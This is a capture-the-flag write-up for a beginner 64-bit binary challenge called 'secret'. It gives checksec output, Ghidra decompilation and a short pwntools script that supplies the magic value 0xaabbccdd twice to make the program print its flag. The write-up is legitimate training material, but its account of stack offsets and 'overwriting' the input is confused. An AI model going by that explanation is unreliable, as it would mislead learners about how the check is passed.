### Binary Exploitation

### Source: TFC_21

### Basic File Checks

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/secret]
└─$ chmod +x secret 
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/secret]
└─$ file secret 
secret: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c218ee479df643755efef28fb34263d506c68e61, not stripped
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/secret]
└─$ checksec secret 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/secret/secret'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We're dealing with a x64 binary which is not stripped

The protections enabled are `NX, PIE`

Lets run the binary and see what it does

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/secret]
└─$ ./secret      
Tell me a secret
pwned
I have already heard that one, sorry
```

It asks for an input then prints some word

Lets decompile using ghidra to take a look at its functions

I'll take a look at the main function and rename some values to make it more understandable

```
int main(void)

{
  undefined8 input;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Tell me a secret");
  input = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  fgets((char *)&input,0x20,stdin);
  if (((int)input == 0xaabbccdd) && (input._4_4_ == -0x55443323)) {
    puts("hmm, interesting");
    system("cat flag");
    putchar(10);
  }
  else {
    puts("I have already heard that one, sorry");
  }
  return 0;
}
```

We see its a simple C code here's what it does

```
1. Prints out tell me a secret
2. Receives input which has an offset of 32bytes 
3. Does an if check which compares the user input to 0xaabbccdd twice
```

So on checking the stack layout I see that the input variable starts with an offset of 0x28 bytes but the input being received is 0x20 bytes

```
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined frame_dummy()
                               Thunked-Function: register_tm_clones
             undefined         AL:1           <RETURN>
                             frame_dummy                                     XREF[3]:     Entry Point(*), 
                                                                                          __libc_csu_init:00101281(c), 
                                                                                          00103de8(*)  
        00101170 e9 7b ff        JMP        register_tm_clones
                 ff ff
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             int __stdcall main(void)
             int               EAX:4          <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[1]:     001011bf(W)  
             undefined8        Stack[-0x18]:8 local_18                                XREF[1]:     001011b7(W)  
             undefined8        Stack[-0x20]:8 local_20                                XREF[1]:     001011af(W)  
             undefined8        Stack[-0x28]:8 input                                   XREF[5,1]:   001011a7(W), 
                                                                                                   001011ce(*), 
                                                                                                   001011df(*), 
                                                                                                   001011e3(*), 
                                                                                                   001011ec(*), 
                                                                                                   001011f4(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:001010ad(*), 00102084, 
                                                                                          00102130(*)  
 ```
 
 From this we can conclude that we have addition 0x8 byte
 
 This is good because we know that the program sets the input to be 0 and we have total control over the input variable
 
 So we can take advantage of the 0x8 byte left by overwriting the input variable with the value the if statement checks 
 
 Here's the python script 
 
 ```
 from pwn import *

sh = process("./secret")
print(sh.recv().decode())
sh.sendline(p32(0xaabbccdd)*2)
print(sh.recvall().decode())
 ```
 
 On running it we get the flag
 
 ```
 ┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/secret]
└─$ python2 exploit.py
[+] Starting local process './secret': pid 77645
Tell me a secret

[+] Receiving all data: Done (40B)
[*] Process './secret' stopped with exit code 0 (pid 77645)
hmm, interesting
FLAG{Y0U_N33D_T0_PWN}
```

And we're done



<br> <br>
[Back_To_Home](../../index.md)
</br>
